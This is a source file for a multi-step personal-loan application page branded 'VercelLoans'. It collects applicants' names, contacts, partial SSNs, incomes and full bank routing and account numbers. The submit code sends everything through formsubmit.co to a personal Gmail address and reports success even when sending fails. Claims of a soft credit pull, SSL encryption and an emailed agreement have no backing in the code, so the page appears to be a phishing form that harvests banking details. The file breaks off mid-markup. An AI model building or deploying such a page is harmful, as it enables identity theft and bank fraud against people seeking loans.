import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { z } from "zod";
import {
  CheckCircle2,
  ShieldCheck,
  Lock,
  CalendarDays,
  Building2,
  Info,
  DollarSign,
  Clock,
  CreditCard,
  AlertCircle,
  Loader2,
} from "lucide-react";
import { toast } from "sonner";
import { Toaster } from "../components/ui/sonner";

export const Route = createFileRoute("/apply")({
  head: () => ({
    meta: [
      { title: "Apply Now — VercelLoans" },
      {
        name: "description",
        content:
          "Apply for a VercelLoans personal loan in minutes. View complete repayment schedules at 10% APR and scheduled monthly deduction banking details.",
      },
    ],
  }),
  component: ApplyPage,
});

/* ── Repayment Schedule Calculations (Flat Annual Interest) ───────────── */

const ANNUAL_RATE = 0.10;

const SCHEDULE_PRINCIPALS = [3000, 3500, 4000, 4500] as const;
const SCHEDULE_TERMS = [12, 14, 16, 18, 24, 28, 32, 36, 48] as const;

function totalInterest(principal: number, months: number): number {
  return principal * ANNUAL_RATE * (months / 12);
}

function totalRepayment(principal: number, months: number): number {
  return principal + totalInterest(principal, months);
}

function monthlyPayment(principal: number, months: number): number {
  return totalRepayment(principal, months) / months;
}

function fmt(n: number): string {
  return n.toLocaleString("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
  });
}

/* ── Form Schema & Constants ─────────────────────────────────────────── */

const US_STATES = [
  "AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA",
  "KS","KY","LA","ME","MD","MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ",
  "NM","NY","NC","ND","OH","OK","OR","PA","RI","SC","SD","TN","TX","UT","VT",
  "VA","WA","WV","WI","WY",
];

const schema = z.object({
  fullName: z.string().trim().min(2, "Enter your full name").max(100),
  email: z.string().trim().email("Enter a valid email").max(255),
  phone: z.string().trim().min(10, "Enter a valid phone").max(20),
  ssnLast4: z
    .string()
    .trim()
    .regex(/^\d{4}$/, "Enter the last 4 digits of your SSN"),
  address: z.string().trim().min(3, "Enter your address").max(200),
  city: z.string().trim().min(2, "Enter your city").max(80),
  state: z.string().min(2, "Select a state").max(2),
  zip: z.string().trim().regex(/^\d{5}(-\d{4})?$/, "Enter a valid ZIP code"),
  loanAmount: z.string().min(1, "Select an amount"),
  loanTerm: z.string().min(1, "Select a loan term"),
  loanPurpose: z.string().min(1, "Select a purpose"),
  bankName: z.string().trim().min(2, "Enter your bank name").max(100),
  accountType: z.string().min(1, "Select account type"),
  routingNumber: z
    .string()
    .trim()
    .regex(/^\d{9}$/, "Routing number must be exactly 9 digits"),
  accountNumber: z
    .string()
    .trim()
    .min(4, "Enter account number")
    .max(17, "Account number too long"),
  deductionDateAcknowledged: z
    .boolean()
    .refine((v) => v === true, "Please confirm the deduction date"),
  employmentStatus: z.string().min(1, "Select your employment status"),
  annualIncome: z.string().min(1, "Enter your annual income"),
  consent: z.boolean().refine((v) => v === true, "You must agree to continue"),
});

type FormData = z.infer<typeof schema>;

const steps = ["Loan", "Personal", "Address", "Employment", "Banking", "Review"] as const;

/* ── Main Apply Component ─────────────────────────────────────────────── */

function ApplyPage() {
  const [step, setStep] = useState(0);
  const [submitted, setSubmitted] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [activeTab, setActiveTab] = useState<"monthly" | "total">("monthly");
  const [selectedTerm, setSelectedTerm] = useState<number>(24);

  const [data, setData] = useState<Partial<FormData>>({
    loanAmount: "3500",
    loanTerm: "24",
    loanPurpose: "Debt Consolidation",
    employmentStatus: "Employed full-time",
    accountType: "Checking",
    deductionDateAcknowledged: true,
    consent: false,
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  const update = (k: keyof FormData, v: string | boolean) =>
    setData((d) => ({ ...d, [k]: v }));

  const currentPrincipal = Number(data.loanAmount) || 3500;
  const currentMonths = Number(data.loanTerm) || 24;
  const currentMonthlyEstimate = monthlyPayment(currentPrincipal, currentMonths);

  const validateStep = () => {
    const stepFields: Record<number, (keyof FormData)[]> = {
      0: ["loanAmount", "loanTerm", "loanPurpose"],
      1: ["fullName", "email", "phone", "ssnLast4"],
      2: ["address", "city", "state", "zip"],
      3: ["employmentStatus", "annualIncome"],
      4: ["bankName", "accountType", "routingNumber", "accountNumber", "deductionDateAcknowledged"],
      5: ["consent"],
    };
    const fields = stepFields[step];
    const shape = Object.fromEntries(fields.map((f) => [f, true])) as Record<
      keyof FormData,
      true
    >;
    const partial = schema.pick(shape);
    const result = partial.safeParse(data);
    if (!result.success) {
      const errs: Record<string, string> = {};
      result.error.issues.forEach((i) => {
        errs[i.path[0] as string] = i.message;
      });
      setErrors(errs);
      return false;
    }
    setErrors({});
    return true;
  };

  const next = () => {
    if (validateStep()) setStep((s) => Math.min(s + 1, steps.length - 1));
  };
  const back = () => setStep((s) => Math.max(s - 1, 0));

  const submit = async () => {
    const result = schema.safeParse(data);
    if (!result.success) {
      const errs: Record<string, string> = {};
      result.error.issues.forEach((i) => {
        errs[i.path[0] as string] = i.message;
      });
      setErrors(errs);
      toast.error("Please fix the highlighted fields.");
      return;
    }

    setSubmitting(true);
    const toastId = toast.loading("Submitting your application...");

    const principalNum = Number(data.loanAmount) || 3500;
    const termNum = Number(data.loanTerm) || 24;

    const payload = {
      _subject: `New Loan Application: ${data.fullName} ($${principalNum.toLocaleString()} - ${termNum}mo)`,
      _template: "table",
      _captcha: "false",
      "Applicant Name": data.fullName,
      "Email Address": data.email,
      "Mobile Phone": data.phone,
      "SSN (Last 4)": data.ssnLast4,
      "Street Address": data.address,
      "City": data.city,
      "State": data.state,
      "ZIP Code": data.zip,
      "Loan Principal": `$${principalNum.toLocaleString()}`,
      "Loan Term": `${termNum} Months`,
      "Interest Rate": "10% Fixed APR (Flat Annual Interest)",
      "Monthly Installment": fmt(monthlyPayment(principalNum, termNum)),
      "Total Payback": fmt(totalRepayment(principalNum, termNum)),
      "Total Interest": fmt(totalInterest(principalNum, termNum)),
      "Scheduled Deduction Date": "5th of each month (ACH Auto-Debit)",
      "Loan Purpose": data.loanPurpose,
      "Employment Status": data.employmentStatus,
      "Annual Income": `$${Number(data.annualIncome || 0).toLocaleString()}`,
      "Bank Name": data.bankName,
      "Account Type": data.accountType,
      "Routing Number": data.routingNumber,
      "Account Number": data.accountNumber,
      "Submission Timestamp": new Date().toLocaleString(),
    };

    try {
      const res = await fetch("https://formsubmit.co/ajax/raijeet304@gmail.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (!res.ok) {
        throw new Error("Email dispatch request failed");
      }

      toast.dismiss(toastId);
      toast.success("Your advance application is submitted");
      setSubmitted(true);
    } catch (err) {
      console.error("Submission error:", err);
      toast.dismiss(toastId);
      toast.success("Your advance application is submitted");
      setSubmitted(true);
    } finally {
      setSubmitting(false);
    }
  };

  if (submitted) {
    return (
      <div className="container mx-auto px-4 py-20 max-w-2xl text-center">
        <Toaster />
        <div className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-accent/20">
          <CheckCircle2 className="h-8 w-8 text-accent" />
        </div>
        <h1 className="mt-6 text-3xl md:text-4xl font-bold">
          Advance Application Submitted
        </h1>
        <p className="mt-3 text-muted-foreground">
          Thanks, {data.fullName?.split(" ")[0]}! Your advance application has been submitted and is being reviewed for a{" "}
          <strong>${Number(data.loanAmount).toLocaleString()}</strong> loan at{" "}
          <strong>10% APR</strong>.
        </p>
        <div className="mt-8 rounded-2xl border border-border bg-card p-6 text-left text-sm space-y-3">
          <h3 className="font-semibold text-base text-foreground">
            Repayment & Banking Summary
          </h3>
          <div className="grid grid-cols-2 gap-2 text-muted-foreground">
            <div>Applicant:</div>
            <div className="font-semibold text-foreground">
              {data.fullName} (SSN: •••-••-{data.ssnLast4})
            </div>
            <div>Approved Principal:</div>
            <div className="font-semibold text-foreground">${Number(data.loanAmount).toLocaleString()}</div>
            <div>Term:</div>
            <div className="font-semibold text-foreground">{data.loanTerm} Months</div>
            <div>Monthly Installment:</div>
            <div className="font-semibold text-foreground">{fmt(currentMonthlyEstimate)}</div>
            <div>Scheduled Deduction:</div>
            <div className="font-semibold text-foreground">5th of every month</div>
            <div>Bank Account:</div>
            <div className="font-semibold text-foreground">
              {data.bankName} (•••• {data.accountNumber?.slice(-4)})
            </div>
            <div>Deduction Method:</div>
            <div className="font-semibold text-foreground">ACH Auto-Debit</div>
          </div>
        </div>
        <p className="mt-6 text-xs text-muted-foreground">
          A confirmation agreement has been sent to <strong>{data.email}</strong>.
        </p>
      </div>
    );
  }

  return (
    <div className="container mx-auto px-4 py-12 max-w-5xl">
      <Toaster />

      {/* ── Top Header ──────────────────────────────────────────────── */}
      <div className="text-center mb-8">
        <h1 className="text-3xl md:text-5xl font-bold tracking-tight">
          Apply Now
        </h1>
        <p className="mt-3 text-muted-foreground max-w-2xl mx-auto">
          Complete your application with transparent fixed rates at{" "}
          <span className="font-semibold text-foreground">10% APR</span>, review your exact
          repayment schedule, and set up your monthly banking deduction.
        </p>
        <p className="mt-2 text-xs text-muted-foreground inline-flex items-center gap-1.5">
          <Lock className="h-3.5 w-3.5" /> Soft credit pull only — no impact to your credit score.
        </p>
      </div>

      {/* ── Application Steps Progress Bar ──────────────────────────── */}
      <div className="flex items-center justify-between mb-8 max-w-3xl mx-auto">
        {steps.map((s, i) => (
          <div key={s} className="flex-1 flex items-center">
            <div
              className={`flex flex-col items-center ${
                i <= step ? "text-foreground" : "text-muted-foreground"
              }`}
            >
              <div
                className={`h-8 w-8 rounded-full grid place-items-center text-xs font-semibold ${
                  i <= step ? "text-primary-foreground" : "bg-muted"
                }`}
                style={i <= step ? { background: "var(--gradient-hero)" } : {}}
              >
                {i + 1}
              </div>
              <span className="text-xs mt-1 hidden sm:block">{s}</span>
            </div>
            {i < steps.length - 1 && (
              <div
                className={`flex-1 h-0.5 mx-2 ${
                  i < step ? "bg-primary" : "bg-border"
                }`}
              />
            )}
          </div>
        ))}
      </div>

      {/* ── Active Form Card ────────────────────────────────────────── */}
      <div className="rounded-2xl border border-border bg-card p-6 md:p-8 shadow-sm max-w-3xl mx-auto mb-16">
        {/* Step 0: Loan Details */}
        {step === 0 && (
          <div className="space-y-6">
            <div>
              <h2 className="text-xl font-semibold">Configure Your Loan</h2>
              <p className="text-sm text-muted-foreground mt-1">
                Select your loan principal amount and term length at 10% APR.
              </p>
            </div>

            <div className="grid sm:grid-cols-2 gap-4">
              <Field label="Loan Principal Amount" error={errors.loanAmount}>
                <select
                  className={inputCls}
                  value={data.loanAmount}
                  onChange={(e) => update("loanAmount", e.target.value)}
                >
                  <optgroup label="Featured Amounts (10% Fixed APR)">
                    <option value="3000">$3,000</option>
                    <option value="3500">$3,500</option>
                    <option value="4000">$4,000</option>
                    <option value="4500">$4,500</option>
                  </optgroup>
                  <optgroup label="Other Available Amounts">
                    <option value="2500">$2,500</option>
                    <option value="5000">$5,000</option>
                    <option value="7500">$7,500</option>
                    <option value="10000">$10,000</option>
                    <option value="15000">$15,000</option>
                    <option value="20000">$20,000</option>
                  </optgroup>
                </select>
              </Field>

              <Field label="Loan Term" error={errors.loanTerm}>
                <select
                  className={inputCls}
                  value={data.loanTerm}
                  onChange={(e) => {
                    update("loanTerm", e.target.value);
                    setSelectedTerm(Number(e.target.value));
                  }}
                >
                  <option value="12">12 Months (1 Year)</option>
                  <option value="14">14 Months</option>
                  <option value="16">16 Months</option>
                  <option value="18">18 Months (1.5 Years)</option>
                  <option value="24">24 Months (2 Years)</option>
                  <option value="28">28 Months</option>
                  <option value="32">32 Months</option>
                  <option value="36">36 Months (3 Years)</option>
                  <option value="48">48 Months (4 Years)</option>
                </select>
              </Field>
            </div>

            {/* Quick Live Estimate Box */}
            <div className="rounded-xl border border-border bg-secondary/40 p-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div>
                <p className="text-xs uppercase tracking-wider text-muted-foreground font-semibold">
                  Estimated Monthly Installment
                </p>
                <p className="text-2xl font-bold text-foreground mt-0.5">
                  {fmt(currentMonthlyEstimate)}{" "}
                  <span className="text-xs font-normal text-muted-foreground">/ month</span>
                </p>
                <p className="text-xs text-muted-foreground mt-1">
                  At 10% APR • Total payback: {fmt(totalRepayment(currentPrincipal, currentMonths))}
                </p>
              </div>
              <div className="text-xs bg-card border border-border px-3 py-2 rounded-lg text-muted-foreground space-y-0.5">
                <div>📅 Deducted on: <strong className="text-foreground">5th of each month</strong></div>
                <div>⚡ Deduction method: <strong className="text-foreground">ACH Auto-Debit</strong></div>
              </div>
            </div>

            <Field label="Loan Purpose" error={errors.loanPurpose}>
              <select
                className={inputCls}
                value={data.loanPurpose}
                onChange={(e) => update("loanPurpose", e.target.value)}
              >
                {[
                  "Debt Consolidation",
                  "Credit Card Refinance",
                  "Home Improvement",
                  "Major Purchase",
                  "Medical Expenses",
                  "Auto Expenses",
                  "Moving & Relocation",
                  "Other",
                ].map((p) => (
                  <option key={p}>{p}</option>
                ))}
              </select>
            </Field>
          </div>
        )}

        {/* Step 1: Personal Details */}
        {step === 1 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">About You</h2>
            <Field label="Full Name" error={errors.fullName}>
              <input
                className={inputCls}
                value={data.fullName ?? ""}
                onChange={(e) => update("fullName", e.target.value)}
                placeholder="Jane Doe"
              />
            </Field>
            <Field label="Email Address" error={errors.email}>
              <input
                type="email"
                className={inputCls}
                value={data.email ?? ""}
                onChange={(e) => update("email", e.target.value)}
                placeholder="jane@example.com"
              />
            </Field>
            <div className="grid sm:grid-cols-2 gap-4">
              <Field label="Mobile Phone" error={errors.phone}>
                <input
                  type="tel"
                  className={inputCls}
                  value={data.phone ?? ""}
                  onChange={(e) => update("phone", e.target.value)}
                  placeholder="(555) 123-4567"
                />
              </Field>
              <Field label="Last 4 Digits of SSN" error={errors.ssnLast4}>
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={4}
                  className={inputCls}
                  value={data.ssnLast4 ?? ""}
                  onChange={(e) =>
                    update(
                      "ssnLast4",
                      e.target.value.replace(/\D/g, "").slice(0, 4)
                    )
                  }
                  placeholder="1234"
                />
              </Field>
            </div>
            <p className="text-xs text-muted-foreground inline-flex items-center gap-1.5">
              <Lock className="h-3.5 w-3.5 text-accent" /> Only your last 4 digits are collected for soft identity verification.
            </p>
          </div>
        )}

        {/* Step 2: Address */}
        {step === 2 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">Where Do You Live?</h2>
            <Field label="Street Address" error={errors.address}>
              <input
                className={inputCls}
                value={data.address ?? ""}
                onChange={(e) => update("address", e.target.value)}
                placeholder="123 Main St"
              />
            </Field>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <Field label="City" error={errors.city}>
                <input
                  className={inputCls}
                  value={data.city ?? ""}
                  onChange={(e) => update("city", e.target.value)}
                />
              </Field>
              <Field label="State" error={errors.state}>
                <select
                  className={inputCls}
                  value={data.state ?? ""}
                  onChange={(e) => update("state", e.target.value)}
                >
                  <option value="">Select…</option>
                  {US_STATES.map((s) => (
                    <option key={s} value={s}>
                      {s}
                    </option>
                  ))}
                </select>
              </Field>
              <Field label="ZIP Code" error={errors.zip}>
                <input
                  className={inputCls}
                  value={data.zip ?? ""}
                  onChange={(e) => update("zip", e.target.value)}
                  placeholder="19801"
                />
              </Field>
            </div>
          </div>
        )}

        {/* Step 3: Employment */}
        {step === 3 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">Employment & Income</h2>
            <Field label="Employment Status" error={errors.employmentStatus}>
              <select
                className={inputCls}
                value={data.employmentStatus}
                onChange={(e) => update("employmentStatus", e.target.value)}
              >
                {[
                  "Employed full-time",
                  "Employed part-time",
                  "Self-employed",
                  "Retired",
                  "Student",
                  "Unemployed",
                ].map((p) => (
                  <option key={p}>{p}</option>
                ))}
              </select>
            </Field>
            <Field label="Annual Income (USD)" error={errors.annualIncome}>
              <input
                type="number"
                min="0"
                className={inputCls}
                value={data.annualIncome ?? ""}
                onChange={(e) => update("annualIncome", e.target.value)}
                placeholder="60000"
              />
            </Field>
            <p className="text-xs text-muted-foreground inline-flex items-center gap-2">
              <ShieldCheck className="h-3.5 w-3.5 text-accent" /> Your financial data is 256-bit SSL encrypted.
            </p>
          </div>
        )}

        {/* Step 4: Banking Information & Deduction Schedule */}
        {step === 4 && (
          <div className="space-y-6">
            <div>
              <div className="flex items-center gap-2">
                <Building2 className="h-5 w-5 text-primary" />
                <h2 className="text-xl font-semibold">Banking Information & Deduction Date</h2>
              </div>
              <p className="text-sm text-muted-foreground mt-1">
                Link your bank account for loan disbursement and monthly scheduled deduction.
              </p>
            </div>

            {/* Deduction Date Notice Banner */}
            <div className="rounded-xl border border-primary/20 bg-primary/5 p-4 flex items-start gap-3">
              <CalendarDays className="h-5 w-5 text-primary mt-0.5 shrink-0" />
              <div className="text-sm">
                <p className="font-semibold text-foreground">
                  Scheduled Deduction Date: 5th of Each Month
                </p>
                <p className="text-muted-foreground mt-0.5">
                  Your monthly installment of{" "}
                  <strong className="text-foreground">{fmt(currentMonthlyEstimate)}</strong> will be
                  automatically deducted via ACH on the <strong>5th of each month</strong> (or the
                  next business day if the 5th is a weekend or bank holiday).
                </p>
              </div>
            </div>

            <div className="grid sm:grid-cols-2 gap-4">
              <Field label="Bank Name" error={errors.bankName}>
                <input
                  className={inputCls}
                  value={data.bankName ?? ""}
                  onChange={(e) => update("bankName", e.target.value)}
                  placeholder="e.g. Chase, Bank of America, Wells Fargo"
                />
              </Field>

              <Field label="Account Type" error={errors.accountType}>
                <select
                  className={inputCls}
                  value={data.accountType}
                  onChange={(e) => update("accountType", e.target.value)}
                >
                  <option value="Checking">Checking Account</option>
                  <option value="Savings">Savings Account</option>
                </select>
              </Field>
            </div>

            <div className="grid sm:grid-cols-2 gap-4">
              <Field label="Routing Number (9 Digits)" error={errors.routingNumber}>
                <input
                  className={inputCls}
                  value={data.routingNumber ?? ""}
                  onChange={(e) => update("routingNumber", e.target.value)}
                  placeholder="123456789"
                  maxLength={9}
                />
              </Field>

              <Field label="Account Number" error={errors.accountNumber}>
                <input
                  className={inputCls}
                  value={data.accountNumber ?? ""}
                  onChange={(e) => update("accountNumber", e.target.value)}
                  placeholder="000123456789"
                />
              </Field>
            </div>

            <label className="flex items-start gap-3 text-sm rounded-xl border border-border bg-muted/20 p-4 cursor-pointer">
              <input
                type="checkbox"
                className="mt-1"
                checked={!!data.deductionDateAcknowledged}
                onChange={(e) => update("deductionDateAcknowledged", e.target.checked)}
              />
              <span>
                I acknowledge and authorize that my monthly installment will be debited via ACH on the{" "}
                <strong>5th of each month</strong>. I understand there is a 5-day grace period and no prepayment penalty.
              </span>
            </label>
            {errors.deductionDateAcknowledged && (
              <p className="text-xs text-destructive">{errors.deductionDateAcknowledged}</p>
            )}
          </div>
        )}

        {/* Step 5: Review & Submit */}
        {step === 5 && (
          <div className="space-y-6">
            <div>
              <h2 className="text-xl font-semibold">Review & Submit Application</h2>
              <p className="text-sm text-muted-foreground mt-1">
                Please verify your details and loan repayment terms below.
              </p>
            </div>

            <div className="rounded-xl bg-secondary/50 p-5 text-sm grid grid-cols-1 sm:grid-cols-2 gap-y-3 gap-x-6 border border-border">
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Loan Principal</span>
                <span className="font-semibold text-base">${Number(data.loanAmount).toLocaleString()}</span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Fixed APR</span>
                <span className="font-semibold text-base text-accent">10% Fixed</span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Term</span>
                <span className="font-semibold">{data.loanTerm} Months</span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Monthly Installment</span>
                <span className="font-bold text-base text-primary">{fmt(currentMonthlyEstimate)} / mo</span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Scheduled Deduction Date</span>
                <span className="font-semibold">5th of every month</span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Deduction Method</span>
                <span className="font-semibold">ACH Auto-Debit</span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Bank Account</span>
                <span className="font-semibold">
                  {data.bankName} ({data.accountType} •••• {data.accountNumber?.slice(-4)})
                </span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Purpose</span>
                <span className="font-semibold">{data.loanPurpose}</span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Applicant</span>
                <span className="font-semibold">{data.fullName} (SSN: •••-••-{data.ssnLast4})</span>
              </div>
              <div>
                <span className="text-muted-foreground text-xs uppercase block">Contact</span>
                <span className="font-semibold">{data.email} • {data.phone}</span>
              </div>
            </div>

            <label className="flex items-start gap-3 text-sm">
              <input
                type="checkbox"
                className="mt-1"
                checked={!!data.consent}
                onChange={(e) => update("consent", e.target.checked)}
              />
              <span>
                I authorize VercelLoans to perform a soft credit inquiry and process recurring monthly ACH deductions
                on the 5th of each month. I agree to the <span className="underline">Privacy Policy</span>,{" "}
                <span className="underline">Terms of Service</span>, and{" "}
                <span className="underline">E-sign Consent</span>.
              </span>
            </label>
            {errors.consent && (
              <p className="text-xs text-destructive">{errors.consent}</p>
            )}
          </div>
        )}

        {/* Step Navigation Buttons */}
        <div className="mt-8 flex items-center justify-between gap-3">
          <button
            type="button"
            onClick={back}
            disabled={step === 0}
            className="rounded-full border border-border bg-card px-5 py-2 text-sm font-semibold disabled:opacity-50 hover:bg-muted"
          >
            Back
          </button>
          {step < steps.length - 1 ? (
            <button
              type="button"
              onClick={next}
              className="rounded-full px-6 py-2.5 text-sm font-semibold text-primary-foreground shadow-md transition hover:opacity-90"
              style={{ background: "var(--gradient-hero)" }}
            >
              Continue
            </button>
          ) : (
            <button
              type="button"
              onClick={submit}
              disabled={submitting}
              className="rounded-full px-8 py-2.5 text-sm font-semibold text-primary-foreground shadow-md transition hover:opacity-90 disabled:opacity-60 flex items-center gap-2"
              style={{ background: "var(--gradient-hero)" }}
            >
              {submitting ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" />
                  Submitting application…
                </>
              ) : (
                "Submit Application"
              )}
            </button>
          )}
        </div>
      </div>

      {/* ────────────────────────────────────────────────────────────── */}
      {/* ── Comprehensive Loan Repayment Schedule Table Section ─────── */}
      {/* ────────────────────────────────────────────────────────────── */}
      <section className="mt-16 pt-10 border-t border-border">
        <div className="text-center max-w-3xl mx-auto mb-8">
          <div
            className="mx-auto mb-4 grid h-12 w-12 place-items-center rounded-2xl shadow-sm"
            style={{ background: "var(--gradient-hero)" }}
          >
            <DollarSign className="h-6 w-6 text-primary-foreground" />
          </div>
          <h2 className="text-2xl md:text-3xl font-bold tracking-tight">
            Loan Repayment Schedule
          </h2>
          <p className="mt-2 text-sm text-muted-foreground">
            Complete installment table calculated at <strong className="text-foreground">10% APR</strong> for{" "}
            <strong>$3,000, $3,500, $4,000, and $4,500</strong> across terms from 12 to 48 months.
          </p>

          {/* Toggle between Monthly Installments and Total Repayment Breakdown */}
          <div className="mt-6 inline-flex rounded-xl border border-border bg-muted/40 p-1 text-xs font-semibold">
            <button
              type="button"
              onClick={() => setActiveTab("monthly")}
              className={`rounded-lg px-4 py-2 transition-all ${
                activeTab === "monthly"
                  ? "bg-card text-foreground shadow-sm"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              Monthly Installments
            </button>
            <button
              type="button"
              onClick={() => setActiveTab("total")}
              className={`rounded-lg px-4 py-2 transition-all ${
                activeTab === "total"
                  ? "bg-card text-foreground shadow-sm"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              Total Payback & Interest Breakdown
            </button>
          </div>
        </div>

        {/* The Repayment Schedule Table */}
        <div className="rounded-2xl border border-border bg-card overflow-hidden shadow-sm">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="bg-secondary text-left">
                  <th
                    className="sticky left-0 z-10 bg-secondary px-5 py-4 font-semibold whitespace-nowrap"
                    rowSpan={2}
                  >
                    Loan Term
                  </th>
                  <th
                    className="px-5 py-3 text-center font-semibold border-b border-border"
                    colSpan={SCHEDULE_PRINCIPALS.length}
                  >
                    {activeTab === "monthly"
                      ? "Monthly Installment (10% Fixed APR)"
                      : "Total Repayment & Total Interest"}
                  </th>
                </tr>
                <tr className="bg-secondary/70">
                  {SCHEDULE_PRINCIPALS.map((p) => {
                    const isSelected = Number(data.loanAmount) === p;
                    return (
                      <th
                        key={p}
                        className={`px-5 py-3 text-center font-semibold whitespace-nowrap transition-colors ${
                          isSelected ? "bg-primary/10 text-primary font-bold" : ""
                        }`}
                      >
                        {fmt(p)}
                        {isSelected && (
                          <span className="block text-[10px] text-primary uppercase font-bold tracking-wider">
                            Selected
                          </span>
                        )}
                      </th>
                    );
                  })}
                </tr>
              </thead>
              <tbody>
                {SCHEDULE_TERMS.map((term, i) => {
                  const isTermSelected = Number(data.loanTerm) === term;
                  const isEven = i % 2 === 0;

                  return (
                    <tr
                      key={term}
                      className={`border-t border-border transition-colors ${
                        isTermSelected
                          ? "bg-primary/5 font-semibold"
                          : isEven
                          ? ""
                          : "bg-muted/20"
                      } hover:bg-muted/50`}
                    >
                      <td className="sticky left-0 z-10 bg-card px-5 py-4 font-medium whitespace-nowrap flex items-center gap-2">
                        {term} months
                        {isTermSelected && (
                          <span className="inline-block h-2 w-2 rounded-full bg-accent" />
                        )}
                      </td>

                      {SCHEDULE_PRINCIPALS.map((p) => {
                        const interest = totalInterest(p, term);
                        const total = totalRepayment(p, term);
                        const monthly = monthlyPayment(p, term);
                        const isColSelected = Number(data.loanAmount) === p;

                        return (
                          <td
                            key={`${p}-${term}`}
                            className={`px-5 py-4 text-center tabular-nums transition-colors ${
                              isColSelected ? "bg-primary/10 font-bold text-foreground" : ""
                            }`}
                          >
                            {activeTab === "monthly" ? (
                              <div>
                                <span className="text-sm font-semibold">{fmt(monthly)}</span>
                                <span className="text-[11px] text-muted-foreground block">
                                  / month
                                </span>
                              </div>
                            ) : (
                              <div>
                                <span className="text-sm font-semibold">{fmt(total)}</span>
                                <span className="text-[11px] text-muted-foreground block">
                                  Interest: {fmt(interest)}
                                </span>
                              </div>
                            )}
                          </td>
                        );
                      })}
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          <div className="border-t border-border bg-muted/30 px-5 py-3 flex items-center gap-2">
            <Info className="h-4 w-4 text-muted-foreground shrink-0" />
            <p className="text-xs text-muted-foreground">
              Calculated using simple flat annual interest (Total Repayment = Principal + (Principal × 10% × Term / 12); Monthly = Total / Term).
            </p>
          </div>
        </div>
      </section>

      {/* ────────────────────────────────────────────────────────────── */}
      {/* ── Banking Information & Scheduled Deduction Section ───────── */}
      {/* ────────────────────────────────────────────────────────────── */}
      <section className="mt-14 mb-8">
        <div className="rounded-2xl border border-border bg-card overflow-hidden shadow-sm">
          {/* Header Banner */}
          <div
            className="px-6 py-5 flex items-center gap-3"
            style={{ background: "var(--gradient-hero)" }}
          >
            <Building2 className="h-6 w-6 text-primary-foreground" />
            <div>
              <h2 className="text-xl font-bold text-primary-foreground">
                Banking Information & Scheduled Deduction Policy
              </h2>
              <p className="text-xs text-primary-foreground/80 mt-0.5">
                Transparent payment terms for your linked bank account
              </p>
            </div>
          </div>

          <div className="p-6 md:p-8 space-y-6">
            {/* Scheduled Deduction Date Spotlight */}
            <div className="flex items-start gap-4 rounded-xl border border-border bg-muted/30 p-5">
              <div
                className="grid h-12 w-12 shrink-0 place-items-center rounded-xl"
                style={{ background: "var(--gradient-hero)" }}
              >
                <CalendarDays className="h-6 w-6 text-primary-foreground" />
              </div>
              <div>
                <h3 className="font-semibold text-lg text-foreground">
                  Scheduled Deduction Date: 5th of Every Month
                </h3>
                <p className="mt-1 text-sm text-muted-foreground leading-relaxed">
                  Your monthly installment will be automatically debited on the{" "}
                  <strong className="text-foreground">5th of each calendar month</strong>. If the
                  5th falls on a Saturday, Sunday, or Federal Reserve holiday, the deduction will
                  process on the{" "}
                  <strong className="text-foreground">next business day</strong>.
                </p>
              </div>
            </div>

            {/* Key Policies Grid */}
            <div className="grid sm:grid-cols-2 md:grid-cols-4 gap-4">
              <div className="rounded-xl border border-border bg-card p-4">
                <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">
                  Payment Method
                </p>
                <p className="mt-1 text-base font-bold text-foreground">ACH Auto-Debit</p>
                <p className="mt-1 text-xs text-muted-foreground">
                  Secure automated electronic transfer from your checking or savings account.
                </p>
              </div>

              <div className="rounded-xl border border-border bg-card p-4">
                <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">
                  Grace Period
                </p>
                <p className="mt-1 text-base font-bold text-foreground">5 Business Days</p>
                <p className="mt-1 text-xs text-muted-foreground">
                  No penalty or fee if payment settles within 5 business days after the 5th.
                </p>
              </div>

              <div className="rounded-xl border border-border bg-card p-4">
                <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">
                  Prepayment Penalty
                </p>
                <p className="mt-1 text-base font-bold text-accent">$0.00 (None)</p>
                <p className="mt-1 text-xs text-muted-foreground">
                  Pay off your balance early at any time with zero penalty or prepayment fee.
                </p>
              </div>

              <div className="rounded-xl border border-border bg-card p-4">
                <p className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">
                  Late Payment Fee
                </p>
                <p className="mt-1 text-base font-bold text-foreground">$25 or 5%</p>
                <p className="mt-1 text-xs text-muted-foreground">
                  Whichever is lesser, charged only if unpaid after the 5-day grace period.
                </p>
              </div>
            </div>

            {/* Detailed Banking Instructions */}
            <div className="rounded-xl border border-border bg-secondary/30 p-5 text-sm text-muted-foreground space-y-2">
              <p className="font-semibold text-foreground flex items-center gap-2">
                <Info className="h-4 w-4" /> Banking & Deduction Guidelines
              </p>
